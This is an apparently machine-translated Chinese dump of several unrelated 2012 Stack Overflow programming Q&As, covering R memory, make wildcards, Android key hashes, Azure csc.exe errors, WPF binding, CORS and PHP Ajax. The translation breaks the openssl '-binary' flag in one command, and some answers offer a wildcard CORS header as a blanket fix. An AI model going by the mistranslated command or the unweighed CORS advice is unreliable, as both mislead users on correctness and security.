32bits/Windows7/4Gb Ram/R Studio 0.96, R 2.15.2 
```

我可以使用 BigMemory 包来引用我的数据库。并在我的数据库上使用函数。我也可以用 ff 包、filehash 等来做到这一点。

问题是在计算简单计算（作为唯一值、平均值等）时，我遇到了典型的问题

> “无法分配向量大小 n mb”

，其中 n 可以小至 70mb - 95mb 等。

我知道到目前为止提供的所有（我认为）解决方案：

```
increase RAM.
launch R with inline code "--max-mem-size XXXX",  
use memory.limit() and memory-size() commands, 
use rm() and gc(), 
work on 64bit, 
close other programs, free memory, reboot, 
use packages bigmemory, ff, filehash, sql, etc etc.
improve your data, use integers, shorts, etc. ...  
check memory usage of intermediate calculations, ... 
etc. 
```

所有这些都经过测试，完成，（除了移动到另一个系统/机器，显然）等。

但是我仍然得到那些“无法分配向量大小 n mb”，例如，其中 n 约为 90mb，R 或其他程序几乎没有使用内存，所有这些都重新启动，新鲜......我知道区别在空闲内存和来自 Windows 和 R 等的分配之间，但是，

这没有任何意义，因为可用内存超过 3GB。我怀疑原因确实是在 windows32b 下——R 内存管理，但是购买 4GB 的 RAM 或将所有系统切换到 64 位以分配 70mb 似乎几乎是个笑话。

有什么我想念的吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-12T12:03:47.863

问题是 R 试图分配 90mb 的连续空间。不幸的是，经过多次操作后，可能内存过于碎片化。

如果可能，请尝试优化您的代码以一次使用小块数据。

如果您尝试像您提到的那样执行简单的计算（例如，均值、最大行数等），您可以尝试使用`biganalytics`，它允许您对`big.matrix`对象执行许多操作。

否则，据我所知，除了切换到 64 位操作系统和 64 位 R 之外，没有什么可做的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-28T20:41:59.640

查看 CRAN 中的[ff 包](http://cran.r-project.org/web/packages/ff/index.html)。它通过将数据分配到固定文件上的内存插槽而不是使用 RAM 来“欺骗”R。它在导入数据方面效果很好。您还可以使用[ffbase 包](http://cran.r-project.org/web/packages/ffbase/index.html)对 ff 对象执行简单、高效的计算。

# regex - GNU 是否使通配符能够匹配更复杂的模式，例如正则表达式？

> ID：13343302
> 
> 赞同：1
> 
> 时间：2012-11-12T11:57:50.163
> 
> 标签：regex, linux, find, wildcard, gnu-make

假设我在生成文件中有以下通配符匹配：

```
data-files = $(wildcard $(ptdf)/*.png) \
    $(wildcard $(ptdf)/*.gif) \
    $(wildcard $(ptdf)/*.bmp) \
    $(wildcard $(ptdf)/*.jpg) \
    $(wildcard $(ptdf)/*.ico) \
    $(wildcard $(ptdf)/*.dist) \
    $(wildcard $(ptdf)/*.html) 
```

通配符语法能否赋予我匹配例如包含 1 到 2 个字母的文件名的能力，就像正则表达式`\w{1,2}`那样？没有文件扩展名？

如果没有，我该如何使用 linux 命令的其他语法（例如`find`等）来做到这一点？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-12T15:05:42.400

下载[源代码](http://ftp.gnu.org/pub/gnu/make/)并 grepping `wildcard`，我们在 function.c 的[第 1332 行](http://cvs.savannah.gnu.org/viewvc/make/function.c?annotate=1.134&root=make#l1333)找到函数的定义-<code>wildcard calls `string_glob`，它只是做[globbing](http://en.wikipedia.org/wiki/Glob_%28programming%29)，而不是正则表达式。并且 grepping 源代码`regex`一无所获：/

由于 make 没有内置的正则表达式函数，我们将不得不使用外部命令。[find(1) 手册页](http://linux.die.net/man/1/find)`regex`上的grepping for显示以下内容将起作用：

```
data-files = $(shell find . -regextype posix-extended -regex '.*\.\w{1,2}') 
```

# javascript - 正则表达式和表单检查

> ID：13343305
> 
> 赞同：3
> 
> 时间：2012-11-12T11:58:15.020
> 
> 标签：javascript, forms, validation, expression

我在这里有一个代码，现在我想向它添加正则表达式。在“Bedrijfsnaam”上，需要接受使用字母字符、数字、空格和一些符号，例如：. - _ 和 @。在“Contactpersoon”上，只需要接受使用字母字符、空格和点即可。对于“电子邮件”，需要接受使用字母字符和 .，后跟 @，然后是字母字符和 -、a。之后最多 3 个字母字符 //这是因为我也希望这个电子邮件地址能够：r.kameel@noordkabels.nl 或 r.kameel@noord-kabels.nl

在“Telefoonnummer”上，它只需要被接受使用 10 位数字。

这是我已经拥有的 javascript 代码：

```
 <script language="JavaScript" type="text/javascript"> 
function validateForm()
{
var x=document.forms["myForm"]["Bedrijfsnaam"].value;
if (x==null || x=="")
  {
  alert("De bedrijfsnaam is niet ingevuld, u wordt verzocht dit veld in te vullen.");
  return false;
  }

  var x=document.forms["myForm"]["Contactpersoon"].value;
if (x==null || x=="")
  {
  alert("De naam van de contactpersoon is niet ingevuld, u wordt verzocht dit veld in te vullen.");
  return false;
  }

  var x=document.forms["myForm"]["Email"].value;
if (x==null || x=="")
  {
  alert("Het E-mailadres van de contactpersoon is niet ingevuld, u wordt verzocht dit veld in te vullen.");
  return false;
  }

    var x=document.forms["myForm"]["Telefoonnummer"].value;
if (x==null || x=="")
  {
  alert("Het telefoonnummer van de contactpersoon is niet ingevuld, u wordt verzocht dit veld in te vullen.");
  return false;
  }

      var x=document.forms["myForm"]["option1"].value;
if (x==null || x=="")
  {
  alert("Zoekwoordcombinatie 1 van de gewenste zoekwoordcombinaties waarop uw bedrijf online vindbaar wil zijn is niet ingevuld, u wordt verzocht dit veld in te vullen.");
  return false;
  }

}

</script> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T12:06:19.200

您可以在以下网站找到一个有用的正则表达式库： [http ://regexlib.com/](http://regexlib.com/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T12:10:01.573

RegExpes 绝对是要走的路。不过，您应该对它们进行更多研究，您知道人们正忙于自己的工作:-)

使用交互式解释器学习正则表达式要容易得多。互联网上有很多，这里是随机的一个：[http ://regexpal.com/](http://regexpal.com/)

# android - 在 Mac 上为 Facebook 应用签名 Android 应用

> ID：13343307
> 
> 赞同：0
> 
> 时间：2012-11-12T11:58:15.660
> 
> 标签：android, facebook, macos

我曾经使用 keytool 在 PC 上签署我的应用程序，并获取在 FB 应用程序中使用的哈希码。

现在，我已经切换到 Mac，我必须再次签署我的应用程序。

我已经按照为 mac 解释的过程在 mac[上找不到 keytool](https://stackoverflow.com/questions/7292832/cannot-find-keytool-on-a-mac)

我已经设法生成签名的 .APK，但我不明白在哪里可以找到我的应用程序在 Mac 上的 Android Key Hash？

谁能指出我正确的方向。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T12:13:29.303

我不是 Mac 用户，因此无法为您提供专门针对 Mac 的解决方案，但我可以为您提供更好、更简单的解决方案。

我在这里发布了类似的答案：[https](https://stackoverflow.com/a/13283088/450534) ://stackoverflow.com/a/13283088/450534 。无论平台如何，第二个解决方案都有效。

试试这个。这与上面链接的答案完全相同。

我总是发现最简单的事情是*让 Facebook SDK 告诉你你的哈希键是什么*。这要简单得多，不应该超过几分钟。

*第 1 步：* 在您的 Facebook SDK 中，找到*Util.java*类。在那，改变这个：

```
private static boolean ENABLE_LOG = false; 
```

至：

```
private static boolean ENABLE_LOG = true; 
```

*第 2 步：* 创建一个**新**的签名 APK，传输到您的设备并安装。如果已经安装，自然会提示。

*第 3 步：* 在运行 DDMS (Logcat) 并将设备连接到计算机的情况下，运行应用程序并继续寻找*密钥不匹配*警告。该警告具有**实际**的哈希键。复制该密钥，转到您的 Facebook 开发人员页面并将新密钥添加到列表中。

您可能还想查看我的这个答案中的评论。[https://stackoverflow.com/a/10516629/450534](https://stackoverflow.com/a/10516629/450534)。在第三条评论中，OP 已将回复发布在`Logcat`.

编辑：官方 Facebook[入门 - 第 4 步](https://developers.facebook.com/docs/getting-started/facebook-sdk-for-android/3.0/)页面提供了用于在 Mac 上生成密钥哈希的命令：

> keytool -exportcert -alias androiddebugkey -keystore ~/.android/debug.keystore | openssl sha1 -二进制 | openssl base64

# opengl - 在 CG 中保存/加载二进制编译的效果文件

> ID：13343313
> 
> 赞同：1
> 
> 时间：2012-11-12T11:58:27.370
> 
> 标签：opengl, cg

我正在开发 NVidia CG。如果我使用此行从文件创建了效果：

```
CGeffect basicEffect = cgCreateEffectFromFile( myContext,
                                               "Data/Shaders/basicEffect.cgfx",
                                                0); 
```

有没有办法将此效果（basicEffect）以编译形式保存到二进制文件中。这样以后如果我想创建效果，我只需加载编译好的效果文件并直接将其分配给 basicEffect ???

有什么帮助吗？

# bash - 如何从 wget 获取真实的文件名

> ID：13343314
> 
> 赞同：6
> 
> 时间：2012-11-12T11:58:26.657
> 
> 标签：bash, filenames, wget

我正在编写一个 bash 脚本并使用 wget 从网站检索一些 PDF 文件。例如：

```
wget www.barb.co.uk/news/item-subscriber/id/213/index.html 
```

但是 wget 将文件保存为 index.html。如果我在浏览器中输入该 URL，它会正确下载具有其真实名称的文件 - “BARB Bulletin 25 - December 10.pdf”。

我怎样才能让 wget 做同样的事情？还是有另一种方法可以找到文件的真实名称（从 bash 脚本中）？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-11-12T12:03:18.730

您可以使用该`--content-disposition`选项使 wget 更复杂地查看 HTTP 响应的标头，这在大多数情况下都有帮助。

例子：

```
wget --content-disposition www.barb.co.uk/news/item-subscriber/id/213/index.html 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-12T12:03:31.497

看看 wgets`--content-disposition`选项。

# asp.net - 在 .NET 4.5 Azure 部署中找不到编译器可执行文件 csc.exe

> ID：13343315
> 
> 赞同：9
> 
> 时间：2012-11-12T11:58:30.150
> 
> 标签：asp.net, asp.net-mvc, azure, .net-4.5, windows-server-2012

我有一个网站，该网站**曾经**有效：

*   ASP.NET 4
*   MVC 3
*   实体框架 4.3
*   以 Azure 网络角色运行（我注意到它是 osFamily="1"，这很奇怪，因为我预计它是 2 - 但无论如何......）
*   Azure SDK 1.7

我已经升级了我的整个代码库，以与大量新玩具保持同步。所以现在是：

*   ASP.NET 4.5
*   MVC 4（剃刀 2）
*   实体框架 5
*   Azure 配置设置为 osFamily="3"
*   Azure SDK 1.8（存储客户端库煞费苦心地升级到 2 而不是 1.7）

当我在登台访问该站点时，我得到一个黄色的死机屏幕，说**Compiler executable file csc.exe can not be found**。我的问题是**为什么？**

它在本地也可以在发布模式下正常工作。我进行了远程操作，并且这些实例肯定在运行 Windows Server 2012（因此 .NET 4.5？？我发现这很难说，因为 .NET 4.5 替换了 .NET 4 文件夹中的 .NET 4 程序集）。

根据响应标头，它肯定在运行 IIS 8，但有趣的是它声称 X-ASPNET-VERSION 是 4.xxxx。这对于 ASP.NET 4 站点是否正常？

**更新：**

我以 .NET 4 框架为目标并将 osFamily 更改为 2，它现在可以工作了。所以我现在怀疑我有一个使用 .NET 3.5 或 2 的第 3 方程序集（事实上我确信我这样做了），但是**当针对高于导入程序集中引用的框架的 .NET 框架时，肯定会使用更高版本的框架??**

osFamily="3" 仅安装了 .NET 4 和 4.5，所以我想这是错误的原因，但我对目标的看法不正确吗？我想使用 osFamily="3" 我可以在这里做什么？

**堆栈跟踪**

```
[InvalidOperationException: Compiler executable file csc.exe cannot be found.]
   System.CodeDom.Compiler.RedistVersionInfo.GetCompilerPath(IDictionary`2 provOptions, String compilerExecutable) +8675071
   Microsoft.CSharp.CSharpCodeGenerator.FromFileBatch(CompilerParameters options, String[] fileNames) +739
   Microsoft.CSharp.CSharpCodeGenerator.FromSourceBatch(CompilerParameters options, String[] sources) +3293761
   Microsoft.CSharp.CSharpCodeGenerator.System.CodeDom.Compiler.ICodeCompiler.CompileAssemblyFromSourceBatch(CompilerParameters options, String[] sources) +64
   HibernatingRhinos.Profiler.Appender.Util.GenerateAssembly.Compile(String fileName, String[] sources, IEnumerable`1 assembliesToReference) +1252
   HibernatingRhinos.Profiler.Appender.Util.GenerateAssembly.CompileAssembly(IEnumerable`1 sourcesResources, IEnumerable`1 assembliesToReference, String assemblyName) +118
   HibernatingRhinos.Profiler.Appender.EntityFramework.EntityFrameworkProfiler.SetupDatabaseDefaultConnectionFactoryIfNeeded() +929
   HibernatingRhinos.Profiler.Appender.EntityFramework.EntityFrameworkProfiler.SetupEntityFrameworkIntegration() +80
   HibernatingRhinos.Profiler.Appender.EntityFramework.EntityFrameworkProfiler.Initialize(EntityFrameworkAppenderConfiguration configuration) +47
   HibernatingRhinos.Profiler.Appender.EntityFramework.EntityFrameworkProfiler.Initialize() +73
   Web4.MvcApplication.Application_Start() +17

[HttpException (0x80004005): Compiler executable file csc.exe cannot be found.]
   System.Web.HttpApplicationFactory.EnsureAppStartCalledForIntegratedMode(HttpContext context, HttpApplication app) +12864673
   System.Web.HttpApplication.RegisterEventSubscriptionsWithIIS(IntPtr appContext, HttpContext context, MethodInfo[] handlers) +175
   System.Web.HttpApplication.InitSpecial(HttpApplicationState state, MethodInfo[] handlers, IntPtr appContext, HttpContext context) +304
   System.Web.HttpApplicationFactory.GetSpecialApplicationInstance(IntPtr appContext, HttpContext context) +404
   System.Web.Hosting.PipelineRuntime.InitializeApplication(IntPtr appContext) +475

[HttpException (0x80004005): Compiler executable file csc.exe cannot be found.]
   System.Web.HttpRuntime.FirstRequestInit(HttpContext context) +12881540
   System.Web.HttpRuntime.EnsureFirstRequestInit(HttpContext context) +159
   System.Web.HttpRuntime.ProcessRequestNotificationPrivate(IIS7WorkerRequest wr, HttpContext context) +12722601 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-03-31T18:10:10.503

I had similar issue. Make sure that you are targeting correct compiler. I was targeting v4.5 (but there shoul be v4.0 as there is now 4.5 compiler)

In web.config check

```
<system.web>
 <compilation debug="true" defaultLanguage="c#" optimizeCompilations="true" targetFramework="4.0">
</system.web> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-14T18:48:25.643

是的，如果您有 Server 2012，那么您肯定运行的是 Fx 4.5 而不是 4.0，因为它是就地升级。

要以粗体字回答您的问题，给定的 ASP.NET 应用程序一次只能使用一个框架。如果您作为 4.5 站点运行，那么任何 2.0/3.5 程序集都应该在框架 4.5 下运行。

所以我怀疑那些旧的程序集*不是*你问题的根源。

话虽如此，我无法解释 csc 问题。包含您收到的确切错误消息以及一些堆栈跟踪可能会有所帮助。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-15T20:47:01.160

好的，David Ebbo 为我指明了正确的方向，我开始仔细研究 Entity Framework Profiler。[这里](https://groups.google.com/forum/?fromgroups=#!topic/nhprof/XY4e3tm-ONc)有一个关于它的线程。

关于它在运行时创建程序集的一些事情，似乎 osfamily="3" (Server 2012) 不允许这样做（它在 osfamily="2" (Server 2008 R2) 上工作）。不会再进行调试了，因为无论如何我都不希望在我的实时环境中使用分析器。删除 EF Profiler 使其工作。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-03-26T23:31:23.227

我发布这个是希望它对某人有所帮助。我们正在使用框架的版本 2 动态编译代码，并且在仅 .net 4 的服务器上我们收到了错误消息。这仅仅是因为我们对框架版本进行了硬编码：

```
var provider = new CSharpCodeProvider(new Dictionary<String, String> { { "CompilerVersion", "v3.5" } }); 
```

所以这只是删除它的问题 - 大概是这样它可以与当时使用的任何版本的框架一起编译。

```
var provider = new CSharpCodeProvider(); 
```

所以错误只是关于需要编译的代码，但所需框架版本的编译器不存在。另一个选项只是确保安装了 .net 3.5 功能。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2020-10-05T18:54:19.553

我对 AWS Windows Server 2019 映像也有类似的问题。

`CSharpCodeProvider`出于兼容性原因，将其设置为 .Net 2.0 版：

```
 new CSharpCodeProvider(new Dictionary<String, String> { { "CompilerVersion", "v2.0" } }); 
```

我已经安装了 ASP 4.7 功能，我的应用程序运行良好，除了这个问题。
事实证明，.Net 2.0 没有安装在机器上。

解决方案 - 从 Windows 服务器管理控制台安装 .Net 3.5 功能。
.Net 3.5 附带 .Net 2.0

# c++ - 像朱利安数用于计算日期是否有任何特定的数字来计算时间

> ID：13343322
> 
> 赞同：0
> 
> 时间：2012-11-12T11:58:47.493
> 
> 标签：c++, julian-date

我想在 C++ 中创建时间数据类型。要计算日期，我们可以使用**julian number**。有没有具体的数字来计算时间

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T12:01:49.517

大多数程序在需要一个数字来表示绝对日期/时间时使用“自 epoc 以来的非闰秒”。epoc 可以是任何东西，但 1970 年 1 月 1 日午夜 UTC 很常见，因为有很多操作系统使用它。如果您使用 32 位有符号类型，那么这对 +/- 68 年有好处。64 位类型很容易涵盖宇宙的年龄。

出于某些目的（例如 GPS 和天文学），“非闰秒”还不够好，您需要实际经过的时间。

您还可以获得该主题的变体，例如 Java 标准库将您推向自 epoc 以来的非闰毫秒，因为这就是`System.currentTimeMillis()`返回的结果。这只适合 32 位类型大约一个月，这就是为什么比 Java 更老的环境并不总是接受它的原因。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T12:13:44.573

不太清楚，但也许你可以看看`struct tm`：

[tm结构](http://www.cplusplus.com/reference/clibrary/ctime/tm/)

# caliburn.micro - 在 Caliburn.Micro 中简化传递属性，类似于 Catel 的 [ExposeAttribute]

> ID：13343323
> 
> 赞同：6
> 
> 时间：2012-11-12T11:58:53.687
> 
> 标签：caliburn.micro

Caliburn.Micro 是否具有与[Catel 的](http://catel.catenalogic.com/) [[ExposeAttribute]](http://catel.catenalogic.com/t_catel_mvvm_exposeattribute.htm)类似的功能？

有没有其他方法可以减轻 Caliburn.Micro 中传递属性的工作？（即模型中的属性以及 ViewModel 中的属性，以允许 View 访问属性。）

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-12T16:03:19.793

定义`ExposeAttribute`：

```
[AttributeUsage(AttributeTargets.Property, AllowMultiple = true)]
public class ExposeAttribute : Attribute
{
    public ExposeAttribute(string propertyName)
    {
        PropertyName = propertyName;
    }

    public ExposeAttribute(string propertyName, string modelPropertyName)
    {
        PropertyName = propertyName;
        ModelPropertyName = modelPropertyName;
    }

    public string PropertyName { get; set; }

    public string ModelPropertyName { get; set; }
} 
```

并使用`ExposedPropertyBinder`我刚刚为你写的这个:)

```
public static class ExposedPropertyBinder
{
    private static readonly ILog Log = LogManager.GetLog(typeof(ExposedPropertyBinder));

    public static void BindElements(IEnumerable<FrameworkElement> elements, Type viewModelType)
    {
        foreach (var element in elements)
        {
            var parts = element.Name.Trim('_')
                .Split(new[] { '_' }, StringSplitOptions.RemoveEmptyEntries);

            // Get first exposed property
            var exposedPropertyInfo = GetExposedPropertyInfo(viewModelType, parts[0]);
            if (exposedPropertyInfo == null)
            {
                Log.Info("Binding Convention Not Applied: Element {0} did not match a property.", element.Name);
                continue;
            }

            var breadCrumb = new List<string> { exposedPropertyInfo.Path };

            // Loop over all parts and get exposed properties
            for (var i = 1; i < parts.Length; i++)
            {
                var exposedViewModelType = exposedPropertyInfo.ViewModelType;

                exposedPropertyInfo = GetExposedPropertyInfo(exposedViewModelType, parts[i]);
                if (exposedPropertyInfo == null) break;

                breadCrumb.Add(exposedPropertyInfo.Path);
            }

            if (exposedPropertyInfo == null)
            {
                Log.Info("Binding Convention Not Applied: Element {0} did not match a property.", element.Name);
                continue;
            }

            var convention = ConventionManager.GetElementConvention(element.GetType());
            if (convention == null)
            {
                Log.Warn("Binding Convention Not Applied: No conventions configured for {0}.", element.GetType());
                continue;
            }

            var applied = convention.ApplyBinding(exposedPropertyInfo.ViewModelType,
                string.Join(".", breadCrumb), exposedPropertyInfo.Property, element, convention);

            var appliedMessage = string.Format(applied 
                ? "Binding Convention Applied: Element {0}." 
                : "Binding Convention Not Applied: Element {0} has existing binding.", element.Name);

            Log.Info(appliedMessage);
        }
    }

    private static ExposedPropertyInfo GetExposedPropertyInfo(Type type, string propertyName)
    {
        foreach (var property in type.GetProperties())
        {
            if (property.Name.Equals(propertyName, StringComparison.OrdinalIgnoreCase))
                return new ExposedPropertyInfo(property.PropertyType, property.Name, property);

            // Get first ExposeAttribute which matches property name
            var exposeAttribute = GetExposeAttribute(property, propertyName);
            if (exposeAttribute == null) continue;

            // Get the name of the exposed property
            var exposedPropertyName = exposeAttribute.ModelPropertyName ?? exposeAttribute.PropertyName;

            var path = string.Join(".", property.Name, exposedPropertyName);
            var viewModelType = property.PropertyType;
            var propertyInfo = property;

            // Check if property exists
            var exposedProperty = viewModelType.GetPropertyCaseInsensitive(exposedPropertyName);
            if (exposedProperty == null)
            {
                // Do recursive check for exposed properties
                var child = GetExposedPropertyInfo(viewModelType, exposedPropertyName);
                if (child == null) continue;

                path = string.Join(".", property.Name, child.Path);
                viewModelType = child.ViewModelType;
                propertyInfo = child.Property;
            }

            return new ExposedPropertyInfo(viewModelType, path, propertyInfo);
        }

        return null;
    }

    private static ExposeAttribute GetExposeAttribute(PropertyInfo property, string propertyName)
    {
        return property
            .GetCustomAttributes(typeof(ExposeAttribute), true)
            .Cast<ExposeAttribute>()
            .FirstOrDefault(a => a.PropertyName.Equals(propertyName, StringComparison.OrdinalIgnoreCase));
    }

    private class ExposedPropertyInfo
    {
        public ExposedPropertyInfo(Type viewModelType, string path, PropertyInfo property)
        {
            ViewModelType = viewModelType;
            Path = path;
            Property = property;
        }

        public Type ViewModelType { get; private set; }

        public string Path { get; private set; }

        public PropertyInfo Property { get; private set; }
    }
} 
```

像这样将它连接到 Caliburn.Micro `ViewModelBinder`：

```
ViewModelBinder.HandleUnmatchedElements = ExposedPropertyBinder.BindElements; 
```

瞧！

使用以下内容装饰您的 ViewModel 属性`ExposeAttribute`：

```
public class MainViewModel : PropertyChangedBase
{
    private Person _person;

    [Expose("FirstName")]
    [Expose("LastName")]
    [Expose("ZipCode")]
    public Person Person
    {
        get { return _person; }
        set
        {
            _person = value;
            NotifyOfPropertyChange(() => Person);
        }
    }
}

public class Person
{
    public string FirstName { get; set; }

    public string LastName { get; set; }

    [Expose("ZipCode", "zip_code")]
    public Address Address { get; set; }

    public string FullName
    {
        get { return string.Join(" ", FirstName, LastName); }
    }

    public override string ToString()
    {
        return FullName;
    }
}

public class Address
{
    public string zip_code { get; set; }
} 
```

并绑定到您的属性：

```
 <TextBlock x:Name="Person_FullName" />
    <TextBlock x:Name="FirstName" />
    <TextBlock x:Name="LastName" />
    <TextBlock x:Name="ZipCode" />                  //
    <TextBlock x:Name="Person_ZipCode" />           // THESE ARE THE SAME ;) 
```

**备注**：这适用于我的简单示例，但尚未经过广泛测试，因此请谨慎使用。

希望对你有帮助！:)

**编辑**：现在可以在[GitHub](https://github.com/khellang/Caliburn.Micro.ExposedProperties)和[NuGet上找到稍微修改过的版本](http://www.nuget.org/packages/caliburn.micro.exposedproperties)

# c# - 将 WPF 数据网格绑定到列表 >

> ID：13343324
> 
> 赞同：3
> 
> 时间：2012-11-12T11:58:53.890
> 
> 标签：c#, wpf, data-binding

我有一个对象列表列表，`List<List<object>>`我想以编程方式将它绑定到 WPF 数据网格。

到目前为止，我已经尝试过：

代码

```
dtgCores.ItemsSource = resinSystemData.data; 
```

xml

```
<DataGrid Name="dtgCores" Grid.Column="1"> 
```

但我只得到 2 列容量和计数。有人可以建议吗？

我有一个列标题列表，我也想以列表的格式使用。

如果oyu需要更多信息，请告诉我。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-12T12:03:19.000

数据网格不是为此而设计的。它需要其列的属性（因此是容量和计数）。

您需要选择：

*   使用另一个数据结构，比如`List<SomeClass>`
*   使用另一个控件。带有 2 个数据模板的嵌套列表框可能会起作用。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2016-09-25T14:30:24.273

默认情况下，a`DataGrid`会将列绑定到它作为`ItemSource`. 这就是为什么当使用 a`List<List<object>>`作为 'ItemSource' 时，每一行都会显示 a 和 的`List`两个`Capacity`属性`Count`。

但是，您可以为每一列创建自己`DataGridColumn`的并将它们绑定到列表的索引。这是一个例子：

```
public void SetTestDataInGrid(List<List<object>> testData)
{
    testGrid.Columns.Clear();
    int colCount = testData.Max(x => x.Count);
    for (int i = 0; i < colCount; i++)
    {
        var currentColumn = new DataGridTextColumn();
        currentColumn.Binding = new Binding(string.Format("[{0}]", i));
        testGrid.Columns.Add(currentColumn);
    }
    testGrid.ItemsSource = testData;
} 
```

此方法检查内部列表的最大长度以确定列数，然后为每列创建一个`DataGridTextColumn`，将每个列绑定到内部列表的正确索引（`[0]`、`[1]`等），然后将 设置`ItemSource`为`testData`.

您可能还想添加`AutoGenerateColumns="False"`到`DataGrid`以防止创建`Capacity`和`Count`列。

# php - 在对 Apache2 进行安全更新后，我的 CORS 请求开始失败。我不知道为什么。

> ID：13343326
> 
> 赞同：2
> 
> 时间：2012-11-12T11:58:59.777
> 
> 标签：php, ajax, apache, cross-domain, cors

直到昨天一切都在工作，并且已经工作了几个月。在提到 XSS 攻击预防的 apache 安全更新之后，它停止了工作。

我花了几个小时在这上面，不知道出了什么问题。正如您从下面的标题中看到的那样，Chrome 请求预检信息，apache 响应并且它们 chrome 说：

**XMLHttpRequest 无法加载[http://neo.octomobi.com/plupload/upload_gallery.php](http://neo.octomobi.com/plupload/upload_gallery.php)。Access-Control-Allow-Origin 不允许来源[http://www.octomobi.com 。](http://www.octomobi.com)**

有任何想法吗？apache对预检的回答有什么问题？

```
Request URL:http://neo.xxx.com/xxxx/xxxx (domain hidden by me for security)
Request Method:OPTIONS
Status Code:200 OK 
```

**请求标头**

```
Accept:*/*
Accept-Charset:ISO-8859-1,utf-8;q=0.7,*;q=0.3
Accept-Encoding:gzip,deflate,sdch
Accept-Language:en-GB,en-US;q=0.8,en;q=0.6
Access-Control-Request-Headers:origin, content-type
Access-Control-Request-Method:POST
Host:neo.xxxx.com
Origin:http://www.xxxx.com (hidden by me)
Proxy-Connection:keep-alive
Referer:http://www.xxxx.com/xxx/xxxx (hidden by me)
User-Agent:Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11 
```

**响应标头**

```
Access-Control-Allow-Headers:Content-Type
Access-Control-Allow-Origin:*
Allow:GET,HEAD,POST,OPTIONS
Connection:Keep-Alive
Content-Length:0
Content-Type:text/html
Date:Mon, 12 Nov 2012 11:47:17 GMT
Keep-Alive:timeout=5, max=100
Proxy-Connection:Keep-Alive
Server:Apache/2.2.20 (Ubuntu)
Via:1.1 FTHW937X
X-Powered-By:PHP/5.3.6-13ubuntu3.9 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T12:01:21.727

```
<?php header('Access-Control-Allow-Origin: *'); ?> 
```

您可以将 Header set Access-Control-Allow-Origin * 设置在 apache conf 或 htaccess 文件上，它就可以工作或者执行以下操作

```
<ifModule mod_headers.c>
    Header set Access-Control-Allow-Origin: *
</ifModule> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T22:14:04.690

经过大量的试验和错误，我得到了它的工作。

我从中了解到的是，由于某种原因，Apache 仅在预检请求中发送 Access-Control-Allow-Origin: * ，而不是在实际请求中。它需要同时出现在预检和实际请求中，否则 CORS 失败。

即使我在 Apache 配置文件和 htaccess 中设置了 Header 设置 Access-Control-Allow-Origin: * 也会发生这种情况（顺便说一下，在我应用这个 Apache 补丁之前它一直在工作）。

所以我找到的解决方案是显式放置 header('Access-Control-Allow-Origin: *'); 在 PHP 返回。这并不理想，因为我必须修改很多文件才能包含它，我宁愿首先弄清楚它为什么停止工作。但至少它现在正在工作。

# php - 三个简单的 Ajax/php 安全问题

> ID：13343328
> 
> 赞同：0
> 
> 时间：2012-11-12T11:59:14.737
> 
> 标签：php, jquery, ajax, security, class

希望有技术知识的人可以为我回答这些问题：

1.  我以前尝试过，我被认为不能在 jQuery Ajax 调用中使用 php 类。这是真的吗，还是有办法让它发挥作用？

2.  如果以上是不可能的，有没有办法在没有类的情况下使用受保护/私有函数和变量？同样，我相信这是不可能的，但很想被证明是错误的。

3.  当数据通过https传递并且无论如何都被加盐和散列服务器端时，以上所有内容是否必要？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T12:07:15.073

1.  这是可能的。你可以使用它们。这取决于你想如何使用它们。有文章如何使用 Zend [http://blog.mysql.lt/ajax-aplikacijos-su-zend_json_server.html](http://blog.mysql.lt/ajax-aplikacijos-su-zend_json_server.html)做到这一点，但它是立陶宛语的。

进一步的dystroy答案......

--

您可以为此使用 PHP 反射类。在 javascript 中实现 php 方法的使用非常容易。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-12T12:01:44.883

> 1 . I've tried before, and I'm led to believe that php classes cannot be used in a jQuery Ajax call. Is this true, Or is there a way of making it work?

False. Many many people use PHP pages to answer ajax requests. in fact any server-side technologies able to answer an HTTP request can be used to provide AJAX content, usually in JSON or XML. Her's the first hit Google gave me : [Handling JSON like a boss in PHP](http://nitschinger.at/Handling-JSON-like-a-boss-in-PHP)

> 2 . If the above is not possible, is there any way of using protected/private functions and variables without classes? Again, I believe this isn't possible, but would love to be proved wrong.

Not relevant as the above is possible.

> 3 . Is the above all even necessary, when the data is passed over https and is salted and hashed server side anyway?

I'm not sure of your exact meaning but AJAX over HTTPS provides authentication and secrecy. Provided your solution is correctly configured, which is very very rare...

You should understand that

*   the essence of AJAX is answering (usually in JSON) javascript made requests made over HTTP just like your usual html page, and PHP can very well do that.
*   PHP objects may be serialized as JSOn for the browser but the PHP code doesn't leave the server. Your private or public functions are all safe : nobody will see the implementation. But I hope your business or security doesn't really rely on this code not leaking. Regarding the client side javascript code needed to handle the logic of the objects, it can't be protected : if a browser can read it, a human can do it too.

# php - 从PHP中的字符串中提取数组中的预定义短语

> ID：13343329
> 
> 赞同：1
> 
> 时间：2012-11-12T11:59:38.837
> 
> 标签：php

```
$phrases = array(
    "New York", "New Jersey", "South Dakota", 
    "South Carolina", "Computer Repair Tech"
);
$string = "I live in New York, but used to live in New Jersey working as a " .
    "computer repair tech."; 
```

提取物`$phrases`发现于`$string`

